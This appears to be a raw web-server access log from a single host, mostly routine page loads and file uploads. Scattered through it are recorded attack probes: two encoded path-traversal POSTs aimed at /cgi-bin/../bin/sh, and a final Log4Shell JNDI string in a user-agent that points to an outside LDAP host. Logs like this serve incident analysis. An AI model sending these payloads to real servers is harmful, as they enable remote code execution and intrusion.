46.246.245.204 - - [14/Feb/2025:21:13:56 +0200] "GET /index.php HTTP/1.1" 200 3410 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:13:57 +0200] "GET /index.php HTTP/1.1" 200 3410 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
8.222.197.158 - - [14/Feb/2025:21:14:03 +0200] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
46.246.245.204 - - [14/Feb/2025:21:14:16 +0200] "GET /index.php HTTP/1.1" 200 1609 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:21:14:20 +0200] "GET /index.php HTTP/1.1" 200 2013 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
8.222.197.158 - - [14/Feb/2025:21:14:37 +0200] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
94.65.186.77 - - [14/Feb/2025:21:14:46 +0200] "POST /upload_shared.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:14:46 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2080 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:21:17:43 +0200] "GET /index.php HTTP/1.1" 200 1988 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:17:55 +0200] "GET /index.php HTTP/1.1" 200 1988 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:21:18:56 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2080 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:21:18:59 +0200] "GET /index.php HTTP/1.1" 200 1609 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:21:19:17 +0200] "POST /upload_shared.php HTTP/1.1" 302 435 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:19:17 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2710 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:19:25 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2710 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:19:26 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2710 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:21:19:31 +0200] "GET /index.php HTTP/1.1" 200 1990 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:21:25:18 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2080 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:25:35 +0200] "POST /upload_shared.php HTTP/1.1" 302 354 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:25:35 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2688 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:25:39 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2688 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:25:57 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2688 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:27:32 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2708 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:27:48 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2708 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:21:27:51 +0200] "GET /index.php HTTP/1.1" 200 1992 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:27:55 +0200] "GET /index.php HTTP/1.1" 200 1992 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:27:56 +0200] "GET /index.php HTTP/1.1" 200 1992 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:27:57 +0200] "GET /index.php HTTP/1.1" 200 1992 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:27:58 +0200] "GET /index.php HTTP/1.1" 200 1992 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:00 +0200] "GET /index.php HTTP/1.1" 200 1992 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:02 +0200] "GET /index.php HTTP/1.1" 200 1624 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:21:28:09 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2100 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:28:26 +0200] "POST /upload_shared.php HTTP/1.1" 502 157 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:28:30 +0200] "POST /upload_shared.php HTTP/1.1" 502 157 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:21:28:37 +0200] "GET /index.php HTTP/1.1" 200 1993 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:38 +0200] "GET /index.php HTTP/1.1" 200 1993 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:40 +0200] "GET /index.php HTTP/1.1" 200 1993 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:50 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:50 +0200] "GET /index.php?upload=success&count=0 HTTP/1.1" 200 2088 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:52 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php?upload=success&count=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:28:52 +0200] "GET /index.php?upload=success&count=0 HTTP/1.1" 200 2088 "https://65.109.103.156/index.php?upload=success&count=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:29:31 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php?upload=success&count=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:29:31 +0200] "GET /index.php?upload=success&count=0 HTTP/1.1" 200 2088 "https://65.109.103.156/index.php?upload=success&count=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:21:29:41 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2709 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:29:43 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2709 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:29:50 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2709 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:21:29:52 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2709 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:21:30:06 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php?upload=success&count=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:21:30:06 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2980 "https://65.109.103.156/index.php?upload=success&count=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:21:30:16 +0200] "GET /index.php?upload=success&count=20 HTTP/1.1" 200 2709 "https://65.109.103.156/index.php?upload=success&count=20" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
202.0.92.253 - - [14/Feb/2025:21:31:44 +0200] "GET / HTTP/1.1" 302 5 "-" "/${jndi:ldap://81.181.248.148:1389/Exploit}" "-"
